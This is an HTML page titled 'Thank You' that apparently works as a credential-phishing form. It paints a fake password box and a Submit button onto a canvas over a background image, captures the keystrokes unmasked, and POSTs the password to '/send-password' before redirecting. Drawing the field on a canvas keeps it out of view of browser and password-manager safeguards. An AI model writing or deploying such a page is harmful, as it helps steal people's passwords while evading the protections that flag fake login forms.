<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Thank You</title>
  <style>
    body { margin: 0; overflow: hidden; }
    canvas { display: block; }
  </style>
</head>
<body>
  <canvas id="canvas" width="800" height="600"></canvas>

  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const bg = new Image();
    bg.src = 'thank-you-background.jpg'; // make sure this file is in /public folder

    const inputBox = {
      x: 230,
      y: 275,
      width: 340,
      height: 45,
      value: '',
      focused: false
    };

    const button = {
      x: 315,
      y: 340,
      width: 165,
      height: 50,
      text: 'Submit'
    };

    bg.onload = () => {
      draw();
    };

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);

      // Input box
      ctx.fillStyle = inputBox.focused ? '#ffffffcc' : '#ffffff88';
      ctx.fillRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
      ctx.strokeStyle = '#333';
      ctx.strokeRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);

      ctx.fillStyle = '#000';
      ctx.font = '20px Arial';
      ctx.fillText(inputBox.value || 'Enter password...', inputBox.x + 10, inputBox.y + 30);

      // Button
      ctx.fillStyle = '#007BFF';
      ctx.fillRect(button.x, button.y, button.width, button.height);
      ctx.fillStyle = '#fff';
      ctx.font = 'bold 18px Arial';
      ctx.fillText(button.text, button.x + 45, button.y + 30);
    }

    canvas.addEventListener('click', (e) => {
      const rect = canvas.getBoundingClientRect();
      const mouseX = e.clientX - rect.left;
      const mouseY = e.clientY - rect.top;

      if (
        mouseX > inputBox.x && mouseX < inputBox.x + inputBox.width &&
        mouseY > inputBox.y && mouseY < inputBox.y + inputBox.height
      ) {
        inputBox.focused = true;
      } else {
        inputBox.focused = false;
      }

      // Button click
      if (
        mouseX > button.x && mouseX < button.x + button.width &&
        mouseY > button.y && mouseY < button.y + button.height
      ) {
        sendPassword(inputBox.value);
      }

      draw();
    });

    window.addEventListener('keydown', (e) => {
      if (!inputBox.focused) return;

      if (e.key === 'Backspace') {
        inputBox.value = inputBox.value.slice(0, -1);
      } else if (e.key === 'Enter') {
        sendPassword(inputBox.value);
      } else if (e.key.length === 1 && inputBox.value.length < 30) {
        inputBox.value += e.key;
      }
      draw();
    });

    function sendPassword(password) {
      if (!password) {
        alert('Please enter a password.');
        return;
      }

      fetch('/send-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      })
      .then(res => res.json())
      .then(data => {
        if (data.success && data.redirect) {
          window.location.href = data.redirect;
        } else {
          alert('Failed to submit password.');
        }
      })
      .catch(err => {
        console.error(err);
        alert('Error submitting password.');
      });
    }
  </script>
</body>
</html>
